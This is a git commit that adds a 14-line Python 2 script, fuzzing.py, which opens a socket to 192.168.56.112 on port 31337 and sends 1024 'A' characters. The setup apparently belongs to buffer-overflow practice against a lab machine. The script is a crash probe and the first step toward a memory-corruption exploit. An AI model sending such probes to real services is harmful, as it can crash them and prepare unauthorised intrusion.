eeba22b34263319d6909b71318cef51c31acbca7
Vinicius Vieira <vinicius3cta@gmail.com>
2020-08-03 10:37:12 -0300

    Create fuzzing.py

---
+++ fuzzing.py
@@ -0,0 +1,14 @@
+#!/usr/bin/env python2
+import socket
+
+RHOST = "192.168.56.112"
+RPORT = 31337
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((RHOST, RPORT))
+
+buf = ""
+buf += "A"*1024
+buf += "\n"
+
+s.send(buf)
